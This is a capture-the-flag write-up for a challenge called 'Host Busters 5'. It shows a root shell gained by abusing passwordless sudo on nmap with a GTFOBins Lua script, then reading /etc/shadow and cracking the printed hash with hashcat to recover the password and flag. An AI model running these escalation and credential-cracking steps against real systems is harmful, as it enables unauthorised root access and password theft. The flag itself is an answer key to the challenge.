###  Host Busters 5

Get upto the point where we have shell, follow Fhost Busters 3 writeup.

```
gh0st404@a5f852d7b453:~$ sudo -l
Matching Defaults entries for gh0st404 on a5f852d7b453:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User gh0st404 may run the following commands on a5f852d7b453:
    (ALL) NOPASSWD: /usr/bin/nmap
    (ALL : ALL) NOPASSWD: /etc/init.d/ssh start
```

We can now just lookup gtfobins and escalate privileges using nmap.

```
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
```

We won't have input echo while using the root shell. I will provide it just for understanding.

```
root@a5f852d7b453:/# cat /etc/shadow | grep -i gh0st404
gh0st404:$6$5d63619132db26f0$4FF5/xxtU1.OPzv2OdnWmB0mG5kqyMGUCAW8crE5ZqS24v6i1sM806eh8SigsZLxeJs/EtK0RJuB.eD.wTjLp/:19568:0:99999:7:::
```

Using hashcat with mode 1800 on the hash. Given in description that this password can be found in common wordlists.

```
$ hashcat -m 1800 -a 0 hash.txt rockyou.txt
...
$6$5d63619132db26f0$4FF5/xxtU1.OPzv2OdnWmB0mG5kqyMGUCAW8crE5ZqS24v6i1sM806eh8SigsZLxeJs/EtK0RJuB.eD.wTjLp/:zaq12wsx
...
```
We get the password.

### Flag
`flag{zaq12wsx}`
